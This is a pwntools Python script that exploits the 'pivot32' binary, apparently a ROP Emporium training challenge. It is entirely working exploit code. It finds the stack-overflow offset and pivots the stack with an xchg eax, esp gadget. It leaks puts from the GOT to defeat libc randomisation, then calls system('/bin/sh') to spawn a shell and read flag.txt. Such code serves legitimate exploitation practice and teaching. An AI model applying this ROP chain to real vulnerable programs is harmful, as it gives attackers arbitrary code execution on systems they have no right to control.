import time

from pwn import *


EXECUTABLE = "./pivot32"
context.binary = elf = ELF(EXECUTABLE)
libc = elf.libc
lib_pivot = ELF("./libpivot32.so")


p = process(EXECUTABLE)
if args.GDB:
    gdb.attach(p)


OFFSET = 44
if OFFSET is None:
    p.sendafter(b"> ", b"AAAA")
    p.sendafter(b"> ", cyclic(128))

    time.sleep(1)
    core = Coredump("./core")
    log.success(f"Core fault address at: {hex(core.fault_addr)}")
    log.info(f"Finding offset for {hex(core.fault_addr)}")
    offset = cyclic_find(core.fault_addr)
    log.success(f"Offset found: {offset}")
    exit()


# Create rop for pivoting
def pivot_rop(pivot_addr: int) -> ROP:
    pivot = ROP(elf)
    pivot(eax=pivot_addr)
    pivot.raw(elf.symbols.usefulGadgets + 0x02) # xchg eax, esp; ret;
    return pivot

# Get pivot point
p.recvuntil(b"to pivot: ")
pivot_point = int(p.recvline(keepends=False), 16)
log.debug(f"Pivot point: {hex(pivot_point)}")

# Leak the addres of puts to get the libc base addres
puts_leak = ROP(elf)
puts_leak.puts(elf.got.puts)
puts_leak.main()

# Send the puts leak
log.debug("Puts leak:\n" + puts_leak.dump())
p.sendafter(b"> ", puts_leak.chain())
p.sendafter(b"> ", flat({ OFFSET: pivot_rop(pivot_point).chain() }))

# Get address of libc
p.recvuntil(b"Thank you!\n")
puts_addr = unpack(p.recv(4).ljust(4, b"\x00"))
libc.address = puts_addr - libc.sym.puts
log.info(f"Libc lives at: {hex(libc.address)}")

# Get new pivot point
p.recvuntil(b"to pivot: ")
pivot_point = int(p.recvline(keepends=False), 16)
log.debug(f"Pivot point: {hex(pivot_point)}")

# Prepare system call
binsh = next(libc.search(b"/bin/sh"))
rop_system = ROP([elf, libc])
rop_system.system(binsh)

# Send system call
log.debug("ROP System:\n" + rop_system.dump())
p.sendafter(b"> ", rop_system.chain())
p.sendafter(b"> ", flat({ OFFSET: pivot_rop(pivot_point).chain() }))
p.recvline() # Thank you


# We now have a shell!
p.send(b"cat flag.txt\n")
flag = str(p.recvline(), "UTF-8")
log.success(f"Flag: {flag}")
